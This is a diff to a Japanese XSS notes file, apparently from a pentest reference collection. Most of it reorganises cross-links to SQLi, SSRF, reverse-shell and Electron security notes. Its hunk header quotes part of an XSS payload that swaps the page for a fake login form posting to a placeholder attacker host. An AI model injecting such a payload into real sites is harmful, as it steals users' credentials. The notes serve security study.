@@ -303,5 +303,6 @@ document.body.innerHTML='<form action="http://[ATTACKER_HOST]/capture">Username:
 - 関連：SQLi（同じ入力フィールドの脆弱性・バイパス手法が重複） → `SQLi.md`
 - 関連：SSRF（入力値がサーバー側リクエストになる経路） → `SSRF.md`
 - 関連：LLM 出力経由の XSS（Improper Output Handling） → `../../06_Concepts/AI_ML/Generative_AI/LLM_Attacks.md`
-- 攻撃側の準備（リスナー起動・到達可能 IP の確認） → `../../06_Concepts/Reverse_Shell.md`
+- 関連：攻撃側の準備（リスナー起動・到達可能 IP の確認） → `../../06_Concepts/Reverse_Shell.md`
 - 後：Electron デスクトップアプリで XSS が発火する環境 → XSS が RCE に到達する可能性 → `Electron_XSS_RCE.md`
+- 関連：Electron の nodeIntegration / contextIsolation の原理・各フレームワークの XSS 対策詳細 → `../../06_Concepts/Electron_Security.md`
